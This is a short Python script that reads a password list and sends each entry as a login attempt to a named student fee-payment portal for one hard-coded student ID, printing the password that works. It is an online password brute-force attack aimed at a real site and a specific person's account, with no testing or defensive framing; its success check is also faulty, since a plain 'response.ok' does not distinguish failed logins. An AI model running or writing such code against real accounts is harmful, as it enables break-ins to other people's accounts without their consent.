import requests

password_list_file = "passwords.txt"
with open(password_list_file, "r") as file:
    passwords = file.readlines()

url = "https://onlinefeestechnocrats.in/LoginStudent.aspx?type=F"  # Add the website URL or API endpoint here
username = "0191AL221037"  # Add your username here

for password in passwords:
    password = password.strip()  # Remove leading/trailing whitespace
    # Prepare the login form data
    form_data = {
        "username": username,
        "password": password
    }

    # Send a POST request to the login form with the current credentials
    response = requests.post(url, data=form_data)

    # Check if the login was successful
    if response.ok:
        print(f"Login successful with password: {password}")
        break
    else:
        print(f"Failed with password: {password}")
